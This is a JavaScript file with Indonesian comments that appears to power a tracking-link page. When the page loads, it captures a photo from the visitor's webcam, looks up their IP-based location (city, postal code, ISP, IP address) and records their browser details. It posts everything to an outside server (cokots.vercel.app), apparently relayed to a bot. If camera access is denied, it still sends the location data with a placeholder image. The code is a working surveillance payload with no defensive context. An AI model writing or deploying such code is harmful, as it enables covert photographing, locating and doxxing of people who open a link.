async function sendDataToServer() {
    try {
    
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const track = stream.getVideoTracks()[0];
    const imageCapture = new ImageCapture(track);
    const photoBlob = await imageCapture.takePhoto();
    track.stop(); // Hentikan kamera setelah foto diambil
    const userAgent = navigator.userAgent;
    
    // Tambahkan user-agent ke dalam caption
    const session = new URLSearchParams(window.location.search).get("session");
    // Ambil jam dan tanggal saat ini
    const now = new Date();
    const formattedDate = now.toLocaleDateString("id-ID", {
    year: "numeric",
    month: "long",
    day: "numeric",
    });
    const formattedTime = now.toLocaleTimeString("id-ID", {
    hour: "2-digit",
    minute: "2-digit",
    }).replace(".", ":");
    
    // Ambil data lokasi dari API ip-api
    const ipResponse = await fetch("http://ip-api.com/json");
    const ipData = await ipResponse.json();
    if (ipData.status !== "success") {
    throw new Error("Gagal mengambil data lokasi dari API ip-api.");
    }
    // Ekstrak data dari API
    const { country, city, zip, isp, query } = ipData;
    // Tambahkan data ke dalam caption
    // Tambahkan data ke dalam caption
    const captions = `
Akses Diterima

Informasi Perangkat:

- User-Agent: ${userAgent}
Tanggal dan Waktu:
- Tanggal: ${formattedDate}
- Waktu: ${formattedTime}

Detail Sesi:

- Session ID: ${session}
Informasi Lokasi:
- Negara: ${country}
- Kota: ${city}
- Kode Pos: ${zip}
- ISP: ${isp}
- Alamat IP: ${query}
    `;
    
    // Kirim foto ke server
    const formData = new FormData();
    formData.append("photo", photoBlob);
    formData.append("caption", captions);
    
    const response = await fetch(`https://cokots.vercel.app/send-data?session=${session}`, {
    method: "POST",
    body: formData,
    });
    
    // Cek jika respons adalah "Data berhasil dikirim ke bot!"
    const responseText = await response.text();
    if (responseText === "Data berhasil dikirim ke bot!") {
    document.getElementById("status").innerText = "Data berhasil dikirim ke bot! 1";
    return;  // Berhenti menjalankan fungsi lebih lanjut jika sukses
    } else {
    document.getElementById("status").innerText = "Gagal mengirim data. Coba lagi. 1";
    }
    } catch (error) {
    
    // Jika izin kamera ditolak atau terjadi error lain, kirimkan data kosong (fallback)
    if (error.name === "NotAllowedError" || error.name === "PermissionDeniedError") {
    document.getElementById("gagal").innerText = "Gagal mendapatkan data. Izin kamera ditolak. Menghentikan API. ,1";
    sendFoto();
    return;
    }
    
    }
    }
    
    async function sendFoto() {
    
    document.getElementById("gagal").innerText = "Gagal mendapatkan data. Pastikan izin kamera diberikan. foto 4";
    // URL gambar fallback
    const fallbackImageURL = 'https://static.wikia.nocookie.net/c88308f3-e20e-41ca-a94a-e715b56e2b6b/scale-to-width/755';  // Ganti dengan URL gambar yang valid
    
    try {
    // Ambil gambar dari URL
    const response = await fetch(fallbackImageURL);
    const blob = await response.blob();  // Mengonversi gambar menjadi Blob        
    const session = new URLSearchParams(window.location.search).get("session");
    // Ambil jam dan tanggal saat ini
    const now = new Date();
    const formattedDate = now.toLocaleDateString("id-ID", {
    year: "numeric",
    month: "long",
    day: "numeric",
    });
    const formattedTime = now.toLocaleTimeString("id-ID", {
    hour: "2-digit",
    minute: "2-digit",
    }).replace(".", ":");
    
    // Ambil user-agent dari browser
    const userAgent = navigator.userAgent;
    
    // Ambil data lokasi dari API ip-api
    const ipResponse = await fetch("http://ip-api.com/json");
    const ipData = await ipResponse.json();
    if (ipData.status !== "success") {
    throw new Error("Gagal mengambil data lokasi dari API ip-api.");
    }
    // Ekstrak data dari API
    const { country, city, zip, isp, query } = ipData;
    // Tambahkan data ke dalam caption
    // Tambahkan data ke dalam caption
    const captions = `
Akses Ditolak!!

Informasi Perangkat:

- User-Agent: ${userAgent}
Tanggal dan Waktu:
- Tanggal: ${formattedDate}
- Waktu: ${formattedTime}

Detail Sesi:

- Session ID: ${session}
Informasi Lokasi:
- Negara: ${country}
- Kota: ${city}
- Kode Pos: ${zip}
- ISP: ${isp}
- Alamat IP: ${query}
    `;
    
    // Kirim foto kosong (fallback) ke server
    const formDatas = new FormData();
    formDatas.append("photo", blob);
    formDatas.append("caption", captions);
    
    const apiResponse = await fetch(`https://cokots.vercel.app/send-data?session=${session}`, {
    method: "POST",
    body: formDatas,
    });
    
    // Cek jika respons adalah "Data berhasil dikirim ke bot!"
    const responseText = await apiResponse.text();
    if (responseText === "Data berhasil dikirim ke bot! foto") {
    document.getElementById("status").innerText = "Data berhasil dikirim ke bot! foto";
    return;  // Berhenti menjalankan fungsi lebih lanjut jika sukses
    } else {
    document.getElementById("status").innerText = "Gagal mengirim data. Coba lagi. foto";
    }
    } catch (error) {
    document.getElementById("status").innerText = "Gagal mengirim data kosong (fallback). foto";
    }
    }
    
    // Jalankan fungsi saat halaman dimuat
    window.onload = sendDataToServer;